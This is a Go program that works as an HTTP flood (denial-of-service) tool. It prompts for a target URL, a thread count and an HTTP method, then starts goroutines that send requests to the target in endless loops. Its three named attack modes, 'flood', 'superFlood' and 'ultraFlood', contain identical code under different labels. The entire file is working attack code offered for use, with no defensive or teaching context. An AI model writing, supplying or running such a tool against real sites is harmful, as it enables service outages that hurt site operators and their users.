package main

import (
	"fmt"
	"net/http"
	"sync"
)

func flood(url string, method string, wg *sync.WaitGroup) {
	defer wg.Done()
	client := &http.Client{}
	fmt.Println("Flood attack is starting on:", url)
	for {
		req, _ := http.NewRequest(method, url, nil)
		client.Do(req)
	}
}

func superFlood(url string, method string, wg *sync.WaitGroup) {
	defer wg.Done()
	client := &http.Client{}
	fmt.Println("Super flood attack is starting on:", url)
	for {
		req, _ := http.NewRequest(method, url, nil)
		client.Do(req)
	}
}

func ultraFlood(url string, method string, wg *sync.WaitGroup) {
	defer wg.Done()
	client := &http.Client{}
	fmt.Println("Ultra flood attack is starting on:", url)
	for {
		req, _ := http.NewRequest(method, url, nil)
		client.Do(req)
	}
}

func main() {
	var url string
	var numThreads int
	var methodNum int

	fmt.Print("Enter the target URL (including http/https): ")
	fmt.Scanln(&url)

	fmt.Print("Enter the number of threads: ")
	fmt.Scanln(&numThreads)

	fmt.Println("Choose HTTP method:")
	fmt.Println("1. GET")
	fmt.Println("2. POST")
	fmt.Println("3. HEAD")
	fmt.Println("4. PUT")
	fmt.Println("5. DELETE")
	fmt.Println("6. OPTIONS")
	fmt.Println("7. PATCH")
	fmt.Print("Enter the HTTP method number: ")
	fmt.Scanln(&methodNum)

	var method string
	switch methodNum {
	case 1:
		method = "GET"
	case 2:
		method = "POST"
	case 3:
		method = "HEAD"
	case 4:
		method = "PUT"
	case 5:
		method = "DELETE"
	case 6:
		method = "OPTIONS"
	case 7:
		method = "PATCH"
	default:
		fmt.Println("Invalid HTTP method. Using GET by default.")
		method = "GET"
	}

	fmt.Println("Choose attack method:")
	fmt.Println("1. flood")
	fmt.Println("2. superFlood")
	fmt.Println("3. ultraFlood")
	fmt.Print("Enter the attack method number: ")
	var attackNum int
	fmt.Scanln(&attackNum)

	var attackFunc func(string, string, *sync.WaitGroup)
	switch attackNum {
	case 1:
		attackFunc = flood
	case 2:
		attackFunc = superFlood
	case 3:
		attackFunc = ultraFlood
	default:
		fmt.Println("Invalid attack method. Using flood by default.")
		attackFunc = flood
	}

	var wg sync.WaitGroup
	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go attackFunc(url, method, &wg)
	}

	wg.Wait()
}
